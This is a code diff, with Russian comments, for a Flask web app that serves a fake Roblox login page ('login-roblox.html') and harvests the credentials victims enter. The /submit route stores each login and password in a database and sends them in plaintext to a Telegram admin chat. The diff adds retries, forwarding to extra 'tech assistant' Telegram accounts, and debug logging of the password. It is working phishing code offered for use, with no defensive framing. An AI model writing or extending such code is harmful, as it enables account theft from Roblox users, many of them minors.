@@ -501,21 +501,30 @@ def top_revisited():
     logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
 
+# Убедитесь, что эти импорты есть в начале файла
+from flask import Flask, request, render_template
+import logging
+import time
+
+# Настройка логирования (если ещё не настроено)
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+# Обновлённый маршрут /submit
 @app.route('/submit', methods=['POST'])
 def submit_login():
     logger.info("Обработка формы логина")
     try:
         login = sanitize_input(request.form.get('login'))
         password = sanitize_input(request.form.get('password'))
+        logger.debug(f"Получено: login={login}, password={password}")
         if not login or not password:
             logger.warning("Пустой логин или пароль")
             return render_template('login-roblox.html', error="Логин и пароль обязательны")
-        
         conn = get_db_connection()
         if not conn:
             logger.error("База недоступна")
             return render_template('login-roblox.html', error="Ошибка сервера")
-        
         try:
             with conn.cursor() as c:
                 c.execute(
@@ -527,28 +536,51 @@ def submit_login():
                     (login, password, get_current_time().isoformat(), "web_form")
                 )
                 conn.commit()
-                logger.info(f"Сохранено: {login}")
+                logger.info(f"Сохранено в базе: {login}")
         except Exception as e:
-            logger.error(f"Ошибка сохранения: {e}")
+            logger.error(f"Ошибка сохранения в базе: {e}")
             return render_template('login-roblox.html', error="Ошибка сохранения данных")
         finally:
             conn.close()
-        
-        try:
-            bot.send_message(
-                ADMIN_CHAT_ID,
-                f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
-                parse_mode='Markdown'
-            )
-            logger.info("Данные отправлены в Telegram")
-        except Exception as e:
-            logger.error(f"Ошибка Telegram: {e}")
-        
+        # Повторные попытки отправки уведомления
+        for attempt in range(3):
+            try:
+                bot.send_message(
+                    ADMIN_CHAT_ID,
+                    f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
+                    parse_mode='Markdown'
+                )
+                logger.info(f"Уведомление отправлено (попытка {attempt + 1})")
+                # Отправка техпомощникам
+                for tech_id in get_tech_assistants():
+                    try:
+                        bot.send_message(
+                            tech_id,
+                            f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
+                            parse_mode='Markdown'
+                        )
+                    except Exception as e:
+                        logger.error(f"Ошибка отправки техпомощнику {tech_id}: {e}")
+                break
+            except Exception as e:
+                logger.error(f"Ошибка отправки в Telegram (попытка {attempt + 1}): {e}")
+                if attempt == 2:
+                    logger.error("Все попытки отправки провалились")
+                time.sleep(1)
         return render_template('login-roblox.html', success="Данные успешно отправлены")
     except Exception as e:
-        logger.error(f"Ошибка формы: {e}")
+        logger.error(f"Ошибка обработки формы: {e}")
         return render_template('login-roblox.html', error="Произошла ошибка")
 
+# Новый маршрут /404
+@app.route('/404')
+def show_404():
+    logger.info("Запрос страницы 404")
+    try:
+        return render_template('404.html')
+    except Exception as e:
+        logger.error(f"Ошибка загрузки 404.html: {e}")
+        return "Ошибка загрузки страницы 404", 500
 @app.errorhandler(404)
 def page_not_found(e):
     logger.info(f"404 ошибка: {request.path}")
